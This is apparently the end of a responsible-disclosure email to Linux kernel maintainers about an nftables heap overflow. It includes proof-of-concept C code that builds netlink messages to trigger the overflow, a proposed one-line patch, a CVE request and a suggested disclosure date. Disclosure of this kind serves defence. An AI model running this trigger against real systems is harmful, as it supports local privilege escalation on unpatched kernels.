     attr = set_u32_attr(attr, NFTA_SET_ELEM_LIST_SET_ID, id);
     attr = set_nested_attr(attr, NFTA_SET_ELEM_LIST_ELEMENTS, 
nested_attr_size);

     attr = set_nested_attr(attr, 0, nested_attr_size - 4);
     attr = set_nested_attr(attr, NFTA_SET_ELEM_KEY, 
NLA_BIN_SIZE(set_keylen));
     attr = set_binary_attr(attr, NFTA_DATA_VALUE, (uint8_t *)buffer, 
set_keylen);
     attr = set_nested_attr(attr, NFTA_SET_ELEM_DATA, U32_NLA_SIZE + 
sizeof(struct nlattr));
     attr = set_nested_attr(attr, NFTA_DATA_VERDICT, U32_NLA_SIZE);
     set_u32_attr(attr, NFTA_VERDICT_CODE, NFT_CONTINUE);

     /* Last netlink message: End of batch */
     nlh_batch_end = get_batch_end_nlmsg();

     /* Setup the iovec */
     memset(iov, 0, sizeof(struct iovec) * 3);
     iov[0].iov_base = (void *)nlh_batch_begin;
     iov[0].iov_len = nlh_batch_begin->nlmsg_len;
     iov[1].iov_base = (void *)nlh_payload;
     iov[1].iov_len = nlh_payload->nlmsg_len;
     iov[2].iov_base = (void *)nlh_batch_end;
     iov[2].iov_len = nlh_batch_end->nlmsg_len;

     /* Prepare the message to send */
     memset(&msg, 0, sizeof(struct msghdr));
     msg.msg_name = (void *)&dest_snl;
     msg.msg_namelen = sizeof(struct sockaddr_nl);
     msg.msg_iov = iov;
     msg.msg_iovlen = 3;

     /* Send message */
     sendmsg(sock, &msg, 0);

     /* Free allocated memory */
     free(nlh_batch_end);
     free(nlh_payload);
     free(nlh_batch_begin);
}

int main(int argc, char **argv) {

     int sock;
     struct sockaddr_nl snl;
     struct leak *bases;

     new_ns();
     printf("[+] Get CAP_NET_ADMIN capability\n");

     /* Netfilter netlink socket creation */
     if ((sock = socket(AF_NETLINK, SOCK_DGRAM, NETLINK_NETFILTER)) < 0) {
         do_error_exit("socket");
     }
     printf("[+] Netlink socket created\n");

     // Binding
     memset(&snl, 0, sizeof(snl));
     snl.nl_family = AF_NETLINK;
     snl.nl_pid = getpid();
     if (bind(sock, (struct sockaddr *)&snl, sizeof(snl)) < 0) {
         do_error_exit("bind");
     }
     printf("[+] Netlink socket bound\n");

     /* Create a netfilter table */
     create_table(sock, TABLE);
     printf("[+] Table created\n");

     /*  Create a netfilter set */
     create_set(sock, SET_NAME, KMALLOC64_KEYLEN, BUFFER_SIZE, TABLE, ID);
     printf("[+] Set created\n");

     /* Prepare the payload for the write primitive */
     add_elem_to_set(sock, SET_NAME, KMALLOC64_KEYLEN, TABLE, ID, 
BUFFER_SIZE, buffer);
     printf("[+] Overflow done\n");

     return EXIT_SUCCESS;
}
```

We propose the following patch. We think that the comparison must be 
mandatory and may be enough for patch this vulnerability.
However, we are not experts at Linux kernel programming and we are still 
unsure if it will not break something along the way.
This patch was applied on the current upstream version.

```diff
static int nft_setelem_parse_data(struct nft_ctx *ctx, struct nft_set *set,
                   struct nft_data_desc *desc,
                   struct nft_data *data,
                   struct nlattr *attr)
{

     ...

-    if (desc->type != NFT_DATA_VERDICT && desc->len != set->dlen) {
+    if (desc->len != set->dlen) {

                 nft_data_release(data, desc->type);
         return -EINVAL;
     }

     return 0;
}
```

We would like to reserve a CVE for this vulnerability.

Also, we would like to release the LPE exploit targeting Ubuntu server 
along with a more detailed blogpost.
If needed, we can supply the exploit. Depending of your workload, we can 
suggest the August, 15th 2022 as a potential date for public disclosure.

Thank you for your attention and we also would like to thank you for all 
the work put on the Linux kernel.

